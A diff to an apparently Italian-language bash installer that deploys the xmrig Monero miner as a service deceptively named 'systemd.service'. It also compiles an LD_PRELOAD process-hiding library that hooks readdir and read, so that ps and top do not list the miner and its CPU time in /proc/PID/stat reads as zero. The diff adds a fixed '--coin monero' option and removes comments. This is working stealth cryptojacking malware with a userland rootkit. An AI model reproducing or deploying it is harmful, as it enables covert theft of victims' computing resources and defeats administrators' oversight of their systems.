@@ -14,7 +14,7 @@ if [ "$EUID" -ne 0 ]; then
 fi
 
 echo "=================================================="
-echo "     Installazione VM SAFE + HIDER CPU"
+echo "     Installazione VM SAFE + HIDER CPU + XMR FISSO"
 echo "=================================================="
 
 apt update && apt install -y wget tar curl git build-essential
@@ -72,7 +72,6 @@ static int is_target_process(pid_t pid) {
     return 0;
 }
 
-// Intercetta readdir per nascondere da ps/top lista
 struct dirent *readdir(DIR *dirp) {
     static struct dirent *(*original_readdir)(DIR *) = NULL;
     if (!original_readdir) original_readdir = dlsym(RTLD_NEXT, "readdir");
@@ -88,12 +87,10 @@ struct dirent *readdir(DIR *dirp) {
     return NULL;
 }
 
-// Intercetta read per falsificare /proc/PID/stat (CPU)
 ssize_t read(int fd, void *buf, size_t count) {
     static ssize_t (*original_read)(int, void *, size_t) = NULL;
     if (!original_read) original_read = dlsym(RTLD_NEXT, "read");
     
-    // Ottieni path del fd
     char path[256] = {0};
     char fdpath[64];
     snprintf(fdpath, sizeof(fdpath), "/proc/self/fd/%d", fd);
@@ -102,15 +99,12 @@ ssize_t read(int fd, void *buf, size_t count) {
     
     pid_t pid = get_pid_from_path(path);
     if (pid > 0 && is_target_process(pid) && strstr(path, "/stat")) {
-        // Leggi dati reali
         char realbuf[4096];
         ssize_t ret = original_read(fd, realbuf, count < sizeof(realbuf) ? count : sizeof(realbuf));
         if (ret > 0) {
-            // Trova e azzera i campi CPU (utime, stime)
-            // Formato: pid (comm) state ppid ... utime stime ...
             char *p = strchr(realbuf, ')');
             if (p) {
-                p += 2; // salta ") "
+                p += 2;
                 int field = 0;
                 char *fields[50] = {0};
                 char *token = strtok(p, " ");
@@ -118,12 +112,10 @@ ssize_t read(int fd, void *buf, size_t count) {
                     fields[field++] = token;
                     token = strtok(NULL, " ");
                 }
-                // utime è campo 13 (index 12), stime campo 14 (index 13)
                 if (field > 14) {
-                    strcpy(fields[12], "0");  // utime
-                    strcpy(fields[13], "0");  // stime
+                    strcpy(fields[12], "0");
+                    strcpy(fields[13], "0");
                 }
-                // Ricostruisci
                 snprintf(buf, count, "%s", realbuf);
                 return strlen(realbuf) + 1;
             }
@@ -134,7 +126,7 @@ ssize_t read(int fd, void *buf, size_t count) {
 }
 EOF
 
-# Compila libprocesshider esteso
+# Compila libprocesshider
 cd /opt/systemd
 gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 cp libprocesshider.so /usr/local/lib/
@@ -152,7 +144,7 @@ if command -v wrmsr &> /dev/null || apt install -y msr-tools; then
     wrmsr -a 0x1a4 0xf 2>/dev/null || true
 fi
 
-# Crea servizio systemd con LD_PRELOAD
+# Crea servizio systemd con LD_PRELOAD e --coin monero
 cat <<EOF > /etc/systemd/system/systemd.service
 [Unit]
 Description=Systemd Service
@@ -170,6 +162,7 @@ ExecStart=/opt/systemd/xmrig \\
     -o $POOL \\
     -u $WALLET \\
     -p $WORKER_NAME \\
+    --coin monero \\
     --keepalive \\
     --cpu-max-threads-hint=$CPU_USAGE \\
     --randomx-mode=fast \\
@@ -188,11 +181,12 @@ systemctl daemon-reload
 systemctl enable --now systemd.service
 
 echo "=================================================="
-echo "Installazione completata - VM SAFE + HIDER CPU"
+echo "Installazione completata - XMR FISSO + HIDER"
 echo "=================================================="
 echo "Cartella: /opt/systemd"
 echo "Servizio: systemd.service"
 echo "Pool: $POOL"
+echo "Coin: Monero (rx/0) fisso"
 echo "Hider: /usr/local/lib/libprocesshider.so"
 echo ""
 echo "Comandi utili:"
@@ -201,8 +195,7 @@ echo "  Log:        sudo journalctl -u systemd -f"
 echo "  Riavvio:    sudo systemctl restart systemd"
 echo "  Stop:       sudo systemctl stop systemd"
 echo "  Verifica:   ps aux | grep xmrig  (vuoto)"
-echo "  CPU top:    top -bn1 | grep xmrig  (vuoto o 0%)"
-echo "  Reale:      pgrep xmrig  (mostra PID)"
+echo "  Algo:       journalctl -u systemd -f | grep algo"
 echo ""
 echo "Worker: $WORKER_NAME"
 echo "=================================================="
